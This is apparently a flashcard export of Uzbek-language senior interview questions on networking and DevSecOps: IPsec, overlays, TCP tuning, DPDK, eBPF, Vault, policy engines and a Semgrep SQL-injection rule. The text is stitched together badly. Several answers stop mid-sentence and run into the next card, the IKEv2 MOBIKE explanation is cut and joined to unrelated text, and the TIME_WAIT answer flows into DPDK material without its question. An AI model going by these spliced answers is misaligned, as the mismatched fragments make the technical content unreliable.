Interview Drill::Networking::H31 DevSecOps & cryptography	idrill-41944	<p>IPsec ESP nima?</p>	<p><b>Qisqa javob:</b> ESP (Encapsulating Security Payload, IP protokol 50) — IPsec'ning paketni <b>shifrlaydigan</b> va autentifikatsiya qiladigan qismi: maxfiylik, yaxlitlik, manba autentifikatsiyasi va anti-replay (sequence number). Ikki rejim: <b>transport</b> (faqat payload) va <b>tunnel</b> (butun asl IP paket yangi IP header ichida).</p><p><b>Muammo:</b> Ikki ofis yoki ofis-AWS VPC orasida ochiq internet orqali xavfsiz L3 aloqa kerak, ilovalarni o'zgartirmasdan.</p><p><b>Qanday ishlaydi:</b></p><pre>Tunnel mode (site-to-site VPN):<br>[Yangi IP hdr][ESP hdr: SPI, Seq][ Asl IP hdr | TCP | data ][pad][ESP trailer][ICV]<br>                                 |&lt;------- shifrlangan ------&gt;|<br>                    |&lt;---------------- autentifikatsiyalangan -------------&gt;|<br>Transport mode (host-host):<br>[Asl IP hdr][ESP hdr][ TCP | data ][trailer][ICV]<br>SPI -&gt; qaysi SA (kalit, algoritm); Seq -&gt; replay oynasi</pre><p>AH (protokol 51) faqat autentifikatsiya beradi, shifrlamaydi va NAT bilan ishlamaydi — amalda deyarli ishlatilmaydi.</p><p><b>Amalda:</b></p><pre>ip xfrm state         # SA'lar: spi, enc aes-gcm, replay-window<br>ip xfrm policy        # qaysi trafik shifrlanadi<br>tcpdump -ni eth0 esp or udp port 4500   # NAT-T bo'lsa ESP UDP 4500 ichida</pre><p>Zamonaviy algoritm: AES-GCM-256 (AEAD) — alohida HMAC kerak emas.</p><p><b>Tuzoqlar:</b></p><ul><li>NAT ortida ESP o'tmaydi (port yo'q) — NAT-T (UDP 4500) yoqilgan bo'lishi kerak.</li><li>Firewall'da faqat UDP 500 ochilgan, protokol 50 yopiq — tunnel &quot;up&quot;, lekin trafik yurmaydi.</li><li>MTU: ESP overhead ~50-70 bayt — katta paketlar fragment yoki drop; MSS clamping kerak.</li></ul><p><b>Senior nuqta:</b> Cloud VPN'lar (AWS Site-to-Site) IPsec/ESP; muammolarning 80% i MTU, NAT-T va ikki tomonda mos kelmagan proposal'lar. Yangi ichki loyihalar uchun WireGuard soddaroq.</p>	lvl::Senior dom::net sec::h31 DevSecOps_cryptography
Interview Drill::Networking::H31 DevSecOps & cryptography	idrill-41945	<p>IPsec IKEv2 nima?</p>	<p><b>Qisqa javob:</b> IKEv2 (Internet Key Exchange v2, UDP 500/4500) — IPsec uchun <b>boshqaruv protokoli</b>: ikki tomon bir-birini autentifikatsiya qiladi (PSK, sertifikat, EAP), algoritmlarni kelishadi, Diffie-Hellman bilan kalit hosil qiladi va ESP uchun Security Association (SA) yaratadi hamda yangilaydi.</p><p><b>Qanday ishlaydi:</b></p><pre>Initiator                                    Responder<br>IKE_SA_INIT  --&gt; SA proposal, KE (DH), Nonce<br>             &lt;-- tanlangan proposal, KE, Nonce       (IKE SA kalitlari tayyor)<br>IKE_AUTH     --&gt; (shifrlangan) ID, AUTH, SA2, TSi/TSr<br>             &lt;-- ID, AUTH, SA2, TS                    (Child SA = ESP tayyor)<br>Jami 4 xabar (IKEv1 main mode'da 6-9 edi)<br>Keyin: CREATE_CHILD_SA (rekey), INFORMATIONAL (DPD, delete)<br>MOBIKE: client IP o'zgarsa (Wi-Fi -&gt; Muammo bo'lsa ikki tomon log'ini parallel o'qing — xabar odatda faqat responder tarafda aniq ko'rinadi.</p>	lvl::Senior dom::net sec::h31 DevSecOps_cryptography
Interview Drill::Networking::H31 DevSecOps & cryptography	idrill-41946	<p>GRE nima?</p>	<p><b>Qisqa javob:</b> GRE (Generic Routing Encapsulation, IP protokol 47) — istalgan L3 (va L2 — GRETAP) paketni boshqa IP paket ichiga o'rab, ikki router orasida virtual point-to-point tunnel yaratadi. Interview Drill::Networking::H31 DevSecOps & cryptography	idrill-41947	<p>VXLAN nima?</p>	<p><b>Qisqa javob:</b> VXLAN — L2 Ethernet frame'larni <b>UDP (port 4789)</b> ichiga o'raydigan overlay protokoli (RFC 7348). 24-bitli VNI (VXLAN Network Identifier) ~16 million alohida L2 segment beradi (VLAN'ning 12-bit = 4094 chegarasiga qarshi) va L2 tarmoqni L3 (routed) underlay ustidan cho'zadi.</p><p><b>Muammo:</b> Multi-tenant data center yoki K8s klaster: node'lar turli subnet'larda, lekin pod/VM'lar bitta &quot;tekis&quot; tarmoqda bo'lishi kerak. Interview Drill::Networking::H31 DevSecOps & cryptography	idrill-41948	<p>CNI tarmog'ida Geneve protokoli nima?</p>	<p><b>Qisqa javob:</b> Geneve (Generic Network Virtualization Encapsulation, RFC 8926, UDP 6081) — VXLAN'ga o'xshash overlay, lekin header'da <b>o'zgaruvchan uzunlikdagi TLV opsiyalar</b> bor: tunnel orqali qo'shimcha metadata (security identity, policy ID) tashish mumkin. Interview Drill::Networking::H31 DevSecOps & cryptography	idrill-41949	<p>PROXY protocol (v1, v2) nima?</p>	<p><b>Qisqa javob:</b> PROXY protocol — HAProxy yaratgan kichik header: L4 proxy (NLB, HAProxy TCP mode) backend'ga ulanganda TCP oqim <b>boshiga</b> client'ning haqiqiy IP/portini yozadi. v1 — matnli qator, v2 — binary (TLV bilan qo'shimcha ma'lumot, masalan AWS VPC endpoint ID). Interview Drill::Networking::H31 DevSecOps & cryptography	idrill-41950	<p>SNI (Server Name Indication) nima?</p>	<p><b>Qisqa javob:</b> SNI (Server Name Indication) — TLS <code>ClientHello</code>dagi kengaytma: client qaysi hostname'ga ulanmoqchi ekanini handshake <b>boshida</b> aytadi. Shunda bitta IP:443 da ko'p domen, har biri o'z sertifikati bilan xizmat qiladi. SNI ochiq matnda yuboriladi; ECH uni shifrlaydi.</p><p><b>Muammo:</b> TLS HTTP'dan oldin bo'ladi — server <code>Host</code> header'ni ko'rishdan oldin sertifikat tanlashi kerak. Privacy talab qilinsa ECH; xavfsizlik nazorati SNI'ga tayansa (egress filtr), ECH va DoH sizni &quot;ko'r&quot; qilishini hisobga oling.</p>	lvl::Senior dom::net sec::h31 DevSecOps_cryptography
Interview Drill::Networking::H31 DevSecOps & cryptography	idrill-41951	<p>TCP keepalive nima?</p>	<p><b>Qisqa javob:</b> TCP keepalive — ulanish bo'sh turganda kernel davriy ravishda bo'sh ACK probe yuboradi: peer javob bermasa, ulanish o'lik deb yopiladi. Linux default: 7200s kutish, 75s oraliq, 9 probe — ya'ni o'lik peer ~2 soat 11 daqiqada aniqlanadi. Ilova <code>SO_KEEPALIVE</code> bilan yoqishi kerak.</p><p><b>Muammo:</b> AWS NLB/NAT Gateway bo'sh TCP ulanishni 350s'da, ko'p firewall'lar 5-60 daqiqada jadvaldan o'chiradi. DB connection pool'dagi ulanish &quot;tirik&quot; ko'rinadi, ilova so'rov yuboradi — javob yo'q, timeout yoki <code>ECONNRESET</code>.</p><p><b>Qanday ishlaydi:</b></p><pre>ulanish bo'sh ---- tcp_keepalive_time (7200s) ----&gt; probe<br>                    javob yo'q -&gt; har tcp_keepalive_intvl (75s) -&gt; probe<br>                    tcp_keepalive_probes (9) marta javob yo'q -&gt; RST, ETIMEDOUT<br>Har probe NAT/firewall jadvalini &quot;yangilaydi&quot; -&gt; ulanish o'chirilmaydi</pre><p><b>Amalda:</b></p><pre>sysctl net.ipv4.tcp_keepalive_time net.ipv4.tcp_keepalive_intvl net.ipv4.tcp_keepalive_probes<br>sysctl -w net.ipv4.tcp_keepalive_time=60 net.ipv4.tcp_keepalive_intvl=10 net.ipv4.tcp_keepalive_probes=6<br>ss -tno state established | grep keepalive     # timer:(keepalive,45sec,0)</pre><p>Socket darajasida (Go'da default 15s): <code>net.Dialer{KeepAlive: 30*time.Second}</code>. PostgreSQL: <code>tcp_keepalives_idle=60</code>. Interview Drill::Networking::H31 DevSecOps & cryptography	idrill-41952	<p>TCP window size va flow control nima?</p>	<p><b>Qisqa javob:</b> TCP window (receive window, <code>rwnd</code>) — qabul qiluvchi har ACK'da &quot;yana shuncha baytni ACK kutmasdan yuborishing mumkin&quot; deb e'lon qiladigan bufer hajmi. Bu <b>flow control</b>: tez yuboruvchi sekin qabul qiluvchini bosib ketmaydi. Header'da 16 bit (64 KB max) — window scaling (RFC 7323) uni 1 GB gacha kengaytiradi.</p><p><b>Muammo:</b> 1 Gbps link, RTT 100 ms (Toshkent-Frankfurt). Agar window 64 KB bo'lsa: throughput = 64KB / 0.1s = 5 Mbps — link'ning 0.5%. Bandwidth-Delay Product (BDP) = 1 Gbps * 0.1 s = 12.5 MB — shuncha window kerak.</p><p><b>Qanday ishlaydi:</b></p><pre>Yuboruvchi              Qabul qiluvchi (bufer 64K)<br> seg1..seg44 --&gt;        ilova sekin o'qiydi, bufer to'ladi<br>            &lt;-- ACK, win=0        (zero window)<br> kutadi, window probe --&gt;<br>            &lt;-- ACK, win=32768    (ilova o'qidi)<br>Effektiv yuborish = min(rwnd, cwnd)   cwnd = congestion window</pre><p><b>Amalda:</b></p><pre>sysctl net.ipv4.tcp_window_scaling          # 1 bo'lishi kerak<br>sysctl net.ipv4.tcp_rmem net.ipv4.tcp_wmem  # min default max (autotuning)<br>sysctl -w net.ipv4.tcp_rmem=&quot;4096 131072 33554432&quot;<br>ss -tin dst 10.0.0.5     # rcv_space, snd_wnd, cwnd, rtt<br>tcpdump -ni eth0 'tcp[14:2] = 0'            # zero window paketlari</pre><p>Wireshark: <code>tcp.analysis.zero_window</code>, <code>tcp.analysis.window_full</code>.</p><p><b>Tuzoqlar:</b></p><ul><li>Ilovada <code>SO_RCVBUF</code> qo'lda qo'yish autotuning'ni o'chiradi — ko'pincha kichikroq bo'lib qoladi.</li><li>Oraliq firewall SYN'dagi window scale opsiyasini kesib tashlasa — butun ulanish 64 KB'da qoladi.</li><li>Zero window ko'p bo'lsa — muammo tarmoqda emas, <b>ilova o'qimayapti</b> (GC pauza, CPU).</li></ul><p><b>Senior nuqta:</b> &quot;Uzoq masofada fayl ko'chirish sekin&quot; — avval BDP hisoblang, keyin <code>ss -tin</code> bilan cwnd/rwnd qaysi biri cheklayotganini ko'ring. Interview Drill::Networking::H31 DevSecOps & cryptography	idrill-41953	<p>TCP congestion control (BBR va CUBIC) xavfsizlik/tarmoq kontekstida farqi.</p>	<p><b>Qisqa javob:</b> | | CUBIC | BBR | |---|---|---| | Signal | Paket yo'qolishi | Bandwidth va min RTT o'lchovi | | Yo'qotishda | cwnd ~30% kamayadi | deyarli ta'sir qilmaydi | | Navbat (bufferbloat) | buferlarni to'ldiradi | navbatni kichik tutadi | | Default | Linux default | Google, YouTube, ko'p CDN | BBR yo'qotishli (Wi-Fi, mobil, uzoq) link'larda throughput va latency'ni sezilarli yaxshilaydi.</p><p><b>Muammo:</b> CUBIC paket yo'qolishini &quot;tarmoq to'la&quot; deb tushunadi. Lekin mobil tarmoqda 1% yo'qotish tirbandlikdan emas, radio shovqindan — CUBIC baribir tezlikni keskin tushiradi. Katta router buferlarida esa CUBIC buferni to'ldirib, latency'ni yuzlab ms ga oshiradi.</p><p><b>Qanday ishlaydi:</b></p><pre>CUBIC:  cwnd ^      /\    /\    /\      oshir -&gt; yo'qotish -&gt; kesish (arra tishi)<br>              |____/  \__/  \__/  \___<br>BBR:    model: BtlBw (max delivery rate) x RTprop (min RTT) = BDP<br>        pacing rate = BtlBw; inflight ~ BDP; davriy ProbeBW / ProbeRTT</pre><p><b>Amalda:</b></p><pre>sysctl net.ipv4.tcp_available_congestion_control<br>modprobe tcp_bbr<br>sysctl -w net.core.default_qdisc=fq<br>sysctl -w net.ipv4.tcp_congestion_control=bbr<br>ss -ti | grep -o 'bbr.*'        # bw, mrtt, pacing_rate</pre><p><b>Xavfsizlik/tarmoq konteksti:</b> Congestion control faqat <b>yuboruvchi</b> tarafda ishlaydi — server'da BBR yoqish yuklab olishlarni tezlashtiradi. BBRv1 CUBIC oqimlariga nisbatan &quot;agressiv&quot; (adolatsiz) bo'lishi mumkin; BBRv3 buni yumshatadi.</p><p><b>Tuzoqlar:</b></p><ul><li>BBRv1'ni <code>fq</code> qdisc'siz ishlatish (eski kernel'larda) — pacing yomon.</li><li>Ichki DC (past RTT, yo'qotish yo'q) — farq deyarli sezilmaydi.</li><li>Benchmark'siz o'zgartirish — real trafikda A/B qiling.</li></ul><p><b>Senior nuqta:</b> Internetga qaragan edge/CDN server'larda BBR — oddiy, isbotlangan yutuq. Interview Drill::Networking::H31 DevSecOps & cryptography	idrill-41954	<p>Ephemeral port exhaustion nima?</p>	<p><b>Qisqa javob:</b> Ephemeral port exhaustion — client bitta manzilga (<code>dst IP:port</code>) juda ko'p qisqa ulanish ochganda, mavjud manba portlari (default <code>32768-60999</code>, ~28 ming) tugaydi va yangi <code>connect()</code> <code>EADDRNOTAVAIL</code> (&quot;Cannot assign requested address&quot;) bilan xato beradi. Interview Drill::Networking::H31 DevSecOps & cryptography	idrill-41955	<p>TCP <code>TIME_WAIT</code> holati nima?</p>	<p><b>Qisqa javob:</b> <code>TIME_WAIT</code> — TCP ulanishni <b>birinchi yopgan</b> (active close) tomon <code>2*MSL</code> davomida (Linux'da qat'iy 60s) turadigan holat. Ikki sabab: (1) oxirgi ACK yo'qolsa, peer'ning qayta yuborgan FIN'iga javob berish; (2) eski ulanishning kechikkan paketlari xuddi shu 4-tuple'li yangi ulanishga aralashib ketmasligi.</p><p><b>Qanday ishlaydi:</b></p><pre>Active closer                 Passive closer<br>ESTABLISHED --FIN--&gt;          CLOSE_WAIT<br>FIN_WAIT_1   &lt;--ACK--<br>FIN_WAIT_2   &lt;--FIN--         LAST_ACK<br>TIME_WAIT    --ACK--&gt;         CLOSED<br>   | 60s kutish<br>CLOSED</pre><p>TIME_WAIT socket xotirada kichik (~ 200 bayt) — muammo xotira emas, <b>port band qilish</b>.</p><p><b>Amalda:</b></p><pre>ss -s                                    # TCP: ... timewait 28000<br>ss -tan state time-wait | head<br>ss -tan state time-wait | awk '{print $5}' | cut -d: -f1 | sort | uniq -c | sort -rn<br>sysctl net.ipv4.tcp_max_tw_buckets       # limitdan oshsa kernel &quot;time wait bucket table overflow&quot; log<br>sysctl -w net.ipv4.tcp_tw_reuse=1        # yangi chiquvchi ulanish TIME_WAIT portini qayta oladi</pre><p><b>Talqin:</b></p><ul><li>Ko'p TIME_WAIT <b>client</b> tarafda — keep-alive/pool yo'q.</li><li>Ko'p TIME_WAIT <b>server</b> tarafda — server ulanishni birinchi yopyapti (HTTP/1.0, <code>Connection: close</code>).</li><li>Ko'p <code>CLOSE_WAIT</code> — boshqa muammo: ilova socket'ni <code>close()</code> qilmayapti (leak!).</li></ul><p><b>Tuzoqlar:</b></p><ul><li><code>SO_LINGER=0</code> bilan RST yuborib TIME_WAIT'dan qochish — ma'lumot yo'qolishi mumkin.</li><li><code>tcp_tw_recycle</code> — o'chirilgan (4.12+), NAT'ni buzardi.</li><li><code>tcp_fin_timeout</code> TIME_WAIT davomiyligini <b>o'zgartirmaydi</b> (u FIN_WAIT_2 uchun) — keng tarqalgan noto'g'ri tushuncha.</li></ul><p><b>Senior nuqta:</b> TIME_WAIT — xato emas, TCP to'g'riligining kafolati. Interrupt, syscall, kernel stack yo'q — bitta yadroda o'nlab million PPS. Narxi: ajratilgan CPU yadrolari 100% band turadi.</p><p><b>Muammo:</b> Kernel stack har paketga: interrupt, skb alloc, protokol qatlamlari, copy, syscall — taxminan 1-2 M PPS/yadro. Router, firewall, load balancer, 5G UPF uchun 10-100 M PPS kerak.</p><p><b>Qanday ishlaydi:</b></p><pre>Kernel yo'li:  NIC -&gt; IRQ -&gt; driver -&gt; netfilter -&gt; TCP/IP -&gt; socket -&gt; syscall -&gt; app<br>DPDK yo'li:    NIC --DMA--&gt; hugepage ring buffer &lt;--poll (busy loop)-- app (userspace)<br>Asoslar: vfio-pci (NIC'ni kernel'dan ajratish), hugepages, CPU pinning, NUMA, batch ishlov</pre><p><b>Amalda:</b></p><pre>echo 1024 &gt; /sys/kernel/mm/hugepages/hugepages-2048kB/nr_hugepages<br>modprobe vfio-pci<br>dpdk-devbind.py --status<br>dpdk-devbind.py --bind=vfio-pci 0000:3b:00.1   # NIC endi `ip link` da ko'rinmaydi!<br>dpdk-testpmd -l 2-3 -n 4 -- -i                 # sinov</pre><p>Kim ishlatadi: OVS-DPDK, VPP (fd.io), Cisco/Juniper virtual router'lar, Envoy emas.</p><p><b>Tuzoqlar:</b></p><ul><li>DPDK'ga berilgan NIC kernel uchun <b>yo'qoladi</b> — tcpdump, iptables, <code>ip</code> ishlamaydi. Boshqaruv interfeysini alohida qoldiring.</li><li>Poll-mode — trafik bo'lmasa ham yadrolar 100% — monitoring'da &quot;CPU to'la&quot; alert'i noto'g'ri signal.</li><li>TCP stack yo'q — o'zingiz (yoki F-Stack, VPP) kerak; oddiy ilovalar uchun mos emas.</li></ul><p><b>Senior nuqta:</b> Bugun ko'p hollarda <b>AF_XDP / XDP</b> (eBPF) kernel'da qolib DPDK'ga yaqin tezlik beradi va mavjud tool'larni saqlaydi. DPDK — maxsus data plane mahsulotlari uchun.</p>	lvl::Senior dom::net sec::h31 DevSecOps_cryptography
Interview Drill::Networking::H31 DevSecOps & cryptography	idrill-41961	<p>eBPF sockops / sockmap bilan socket'larni tezlashtirish nima?</p>	<p><b>Qisqa javob:</b> sockops — TCP ulanish hodisalarida (connect, established) ishga tushadigan eBPF dastur turi; <b>sockmap</b> — socket'lar saqlanadigan eBPF map. Ular birga: bir node'dagi ikki lokal socket (pod A -&gt; pod B yoki app -&gt; sidecar) aniqlansa, <code>sk_msg</code> dasturi ma'lumotni yuboruvchi socket'dan qabul qiluvchi socket'ga <b>to'g'ridan-to'g'ri</b> yo'naltiradi — TCP/IP stack, loopback, iptables chetlab o'tiladi.</p><p><b>Muammo:</b> Service mesh'da har so'rov: app -&gt; lokal Envoy sidecar -&gt; tarmoq -&gt; Envoy -&gt; app. Lokal hop'lar ham to'liq TCP stack orqali o'tadi (ikki marta) — latency va CPU isrofi.</p><p><b>Qanday ishlaydi:</b></p><pre>1. sockops: TCP established hodisasi -&gt; socket'ni sockmap'ga qo'sh (key = 4-tuple)<br>2. sk_msg (sendmsg hook): app write() -&gt; peer 4-tuple sockmap'da bormi?<br>      ha  -&gt; bpf_msg_redirect_hash -&gt; peer socket'ning receive queue'siga<br>      yo'q -&gt; odatiy stack<br>App A --write--&gt; [sk_msg] ---------------&gt; App B socket   (stack yo'q)</pre><p><b>Amalda:</b></p><pre>bpftool prog show | grep -E 'sock_ops|sk_msg'<br>bpftool map show | grep sockhash<br>bpftool cgroup tree /sys/fs/cgroup     # sockops qaysi cgroup'ga biriktirilgan<br># Cilium<br>cilium config view | grep sockops      # sockops-enable</pre><p><b>Tuzoqlar:</b></p><ul><li>Trafik stack'ni chetlab o'tadi — tcpdump uni <b>ko'rmaydi</b>, iptables/NetworkPolicy qoidalari ishlamasligi mumkin. Interview Drill::Networking::H31 DevSecOps & cryptography	idrill-41965	<p>Vault response wrapping nima?</p>	<p><b>Qisqa javob:</b> Response wrapping — Vault haqiqiy javobni (secret yoki token) <b>cubbyhole</b>ga qo'yib, o'rniga qisqa TTL'li, <b>bir martalik</b> wrapping token qaytaradi. Qabul qiluvchi <code>unwrap</code> qilib asl secret'ni oladi. Agar token yo'lda ushlanib ochilgan bo'lsa, haqiqiy qabul qiluvchi xato oladi — buzilish darhol ma'lum bo'ladi.</p><p><b>Muammo:</b> CI pipeline yangi servis uchun AppRole <code>secret_id</code> yaratib, uni deploy tizimi orqali server'ga yetkazadi. Yo'lda u log'larga, CI artefaktlariga tushadi. Kim ko'rgan — noma'lum, va secret uzoq yashaydi.</p><p><b>Qanday ishlaydi:</b></p><pre>Orchestrator --(X-Vault-Wrap-TTL: 5m)--&gt; Vault: secret_id yarat<br>Vault: secret_id -&gt; cubbyhole(wrap token)  ; qaytaradi: wrap token (hvs.CAES...)<br>Orchestrator --wrap token--&gt; target server (log'ga tushsa ham faqat 5 daq, 1 marta)<br>Target: vault unwrap -&gt; secret_id  ; wrap token endi yaroqsiz<br>Hujumchi oldin unwrap qilsa -&gt; target &quot;token not found&quot; -&gt; ALERT</pre><p><b>Amalda:</b></p><pre>vault write -wrap-ttl=5m -f auth/approle/role/web/secret-id<br># wrapping_token: hvs.CAESIB...  wrapping_token_ttl: 5m<br>vault token lookup -wrapped-token? # yoki:<br>vault write sys/wrapping/lookup token=hvs.CAESIB...   # creation_path tekshirish<br>VAULT_TOKEN=hvs.CAESIB... vault unwrap</pre><p>Tekshirishda <code>creation_path</code> kutilgan yo'l (<code>auth/approle/role/web/secret-id</code>) ekanini tasdiqlang — hujumchi boshqa wrap token bermaganiga ishonch.</p><p><b>Tuzoqlar:</b></p><ul><li>Unwrap xatosini jim o'tkazib yuborish — butun mexanizm ma'nosi yo'qoladi; xato = security incident.</li><li>Uzun wrap TTL (24 soat) — oyna kattalashadi.</li><li><code>creation_path</code>ni tekshirmaslik — soxta wrapped secret'ni qabul qilish.</li></ul><p><b>Senior nuqta:</b> Response wrapping — &quot;secure introduction&quot; naqshi: secret'ni uzatish kanaliga ishonmasdan yetkazish. Interview Drill::Networking::H31 DevSecOps & cryptography	idrill-41966	<p>Vault lease ID va revocation nima?</p>	<p><b>Qisqa javob:</b> Vault har dynamic secret (DB credential, AWS key) va token uchun <b>lease</b> yaratadi: lease ID, TTL, renewable belgisi. Mijoz TTL tugashidan oldin <code>renew</code> qiladi; qilmasa yoki lease <code>revoke</code> qilinsa Vault backend'dagi credential'ni (masalan PostgreSQL user'ni) <b>haqiqatan o'chiradi</b>. Prefix bo'yicha ommaviy revoke — incident'da bir buyruq bilan hammasini o'ldirish.</p><p><b>Muammo:</b> Statik DB paroli yillar davomida o'zgarmaydi, 20 servis va 5 dasturchi biladi. Interview Drill::Networking::H31 DevSecOps & cryptography	idrill-41968	<p>Sentinel va OPA Rego farqi.</p>	<p><b>Qisqa javob:</b> | | HashiCorp Sentinel | OPA (Rego) | |---|---|---| | Litsenziya | Xususiy, faqat HashiCorp Enterprise/HCP mahsulotlarida | Ochiq (CNCF graduated) | | Qayerda | Terraform Cloud/Enterprise, Vault, Consul, Nomad Enterprise | K8s (Gatekeeper), Terraform (conftest), Envoy, API, CI | | Til | Sentinel — imperativ-ga yaqin, o'qish oson | Rego — deklarativ, Datalog uslubida | | Darajalar | advisory / soft-mandatory / hard-mandatory | Integratsiyaga bog'liq (deny/warn) |</p><p><b>Muammo:</b> &quot;Prod'da faqat <code>t3</code>/<code>m6</code> instance turi&quot;, &quot;har resursda <code>owner</code> tegi&quot;, &quot;public S3 taqiqlangan&quot; — bu qoidalarni review'da odam tekshirsa unutiladi. Interview Drill::Networking::H31 DevSecOps & cryptography	idrill-41969	<p>Kyverno generate qoidasi nima?</p>	<p><b>Qisqa javob:</b> Kyverno <code>generate</code> qoidasi — trigger resurs (odatda yangi Namespace) yaratilganda Kyverno avtomatik boshqa resurslarni yaratadi: default-deny NetworkPolicy, ResourceQuota, LimitRange, RoleBinding yoki boshqa namespace'dan Secret nusxasi. <code>synchronize: true</code> bo'lsa, generatsiya qilingan resurs o'zgartirilsa yoki o'chirilsa — Kyverno uni qayta tiklaydi.</p><p><b>Muammo:</b> Platform jamoasi talab qiladi: har namespace'da default-deny tarmoq, kvota va registry pull secret bo'lsin. Interview Drill::Networking::H31 DevSecOps & cryptography	idrill-41973	<p>Semgrep nima?</p>	<p><b>Qisqa javob:</b> Semgrep — kodni syntax tree (AST) darajasida <b>pattern</b> bilan qidiradigan tez, ko'p tilli SAST tool. Qoidalar kodning o'ziga o'xshab yoziladi (<code>$X.execute(&quot;...&quot; + $Y)</code>), shu sababli jamoa o'z bug naqshlari uchun qoidani daqiqalarda yoza oladi. Pro versiyada cross-file taint tahlili bor.</p><p><b>Muammo:</b> grep <code>execute(</code> ni topadi, lekin bo'shliq, o'zgaruvchi nomi, ko'p qatorli kodni farqlay olmaydi — ko'p false positive. Og'ir SAST'lar (CodeQL) esa build talab qiladi va sekin. PR'da 30 sekundda natija kerak.</p><p><b>Qanday ishlaydi:</b></p><pre>kod -&gt; parser (tree-sitter) -&gt; AST<br>qoida pattern -&gt; AST pattern; metavariable $X istalgan ifodaga mos<br>...  = &quot;istalgan narsa&quot;; pattern-not, pattern-inside = kontekst<br>taint mode: source (request.args) -&gt; sink (cursor.execute) sanitizer'siz</pre><p><b>Amalda:</b></p><pre># rules/sqli.yml<br>rules:<br>  - id: python-sqli-string-concat<br>    languages: [python]<br>    severity: ERROR<br>    message: SQL so'rov string birlashtirish bilan qurilgan — parametr ishlating<br>    pattern-either:<br>      - pattern: $CUR.execute(&quot;...&quot; + $X, ...)<br>      - pattern: $CUR.execute(f&quot;...&quot;, ...)</pre><pre>semgrep scan --config p/owasp-top-ten --config rules/ --error<br>semgrep scan --config auto --baseline-commit origin/main   # faqat yangi topilmalar</pre><p>Chiqish: <code>app/db.py:42 python-sqli-string-concat  cur.execute(&quot;SELECT * FROM u WHERE id=&quot; + uid)</code>.</p><p><b>Tuzoqlar:</b></p><ul><li>Community qoidalar bilan butun eski repo'ni skanerlash — minglab topilma, jamoa e'tibor bermay qo'yadi. <code>--baseline-commit</code> bilan faqat yangi kod.</li><li>OSS versiya intra-file — fayllar orasidagi data flow'ni ko'rmaydi.</li><li><code># nosemgrep</code> izohlarini review'siz qo'yish.</li></ul><p><b>Senior nuqta:</b> Semgrep'ning kuchli tomoni — <b>o'z incident'laringizdan</b> qoida yozish: bug bir marta prod'ga chiqdi -&gt; qoida -&gt; boshqa hech qachon. Bu &quot;guardrail&quot; madaniyati.</p>	lvl::Senior dom::net sec::h31 DevSecOps_cryptography
